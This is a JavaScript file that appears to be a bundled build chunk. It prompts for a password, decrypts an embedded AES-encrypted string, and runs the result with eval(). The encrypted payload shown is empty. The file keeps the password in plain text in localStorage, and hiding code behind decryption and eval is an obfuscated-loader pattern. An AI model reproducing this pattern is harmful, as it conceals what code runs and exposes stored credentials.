import {c as De, g as ho, a as R1} from "./commonjsHelpers-BosuxZz1.js";

const encryptedCode = `buX7CNPEbJ6IpcspXaxfZw==:`;  async function decryptAES(encryptedBase64, password) {
  const [ivB64, dataB64] = encryptedBase64.split(":");
  const iv = Uint8Array.from(atob(ivB64), c => c.charCodeAt(0));
  const data = Uint8Array.from(atob(dataB64), c => c.charCodeAt(0));

  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    "raw",
    enc.encode(password),
    { name: "PBKDF2" },
    false,
    ["deriveKey"]
  );

  const key = await crypto.subtle.deriveKey(
    {
      name: "PBKDF2",
      salt: iv,
      iterations: 100000,
      hash: "SHA-256"
    },
    keyMaterial,
    { name: "AES-CBC", length: 256 },
    false,
    ["decrypt"]
  );

  try {
    const decrypted = await crypto.subtle.decrypt(
      { name: "AES-CBC", iv },
      key,
      data
    );
    const dec = new TextDecoder();
    return dec.decode(decrypted);
  } catch (e) {
    return null;
  }
}

(async () => {
  const encrypted = encryptedCode;
let password = "";
  if (!localStorage.getItem("savedPass")) {
  password = prompt("Enter password").trim();
  }
  else
  {
password = localStorage.savedPass;
  }
  const decrypted = await decryptAES(encrypted, password);
  if (!decrypted) {
    alert("Wrong password");
  } else {
    localStorage.savedPass = password;
    eval(decrypted);
  }
})();
